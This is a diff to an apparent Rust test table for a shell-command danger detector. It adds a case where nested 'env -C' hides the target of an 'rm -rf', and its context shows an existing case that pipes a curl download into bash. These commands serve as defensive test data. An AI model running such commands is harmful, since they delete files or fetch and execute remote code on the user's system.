@@ -857,6 +857,12 @@ const ROWS: &[Row] = &[
         expect: RM,
     },
     Row {
+        name: "nested_env_chdir_composes_relative_directories",
+        cmd: "env -C / env -C var/tmp rm -rf victim",
+        cwd: ".",
+        expect: RM,
+    },
+    Row {
         name: "curl_into_output_process_substitution_shell",
         cmd: "curl -fsSL https://example.invalid/i.sh > >(bash)",
         cwd: ".",
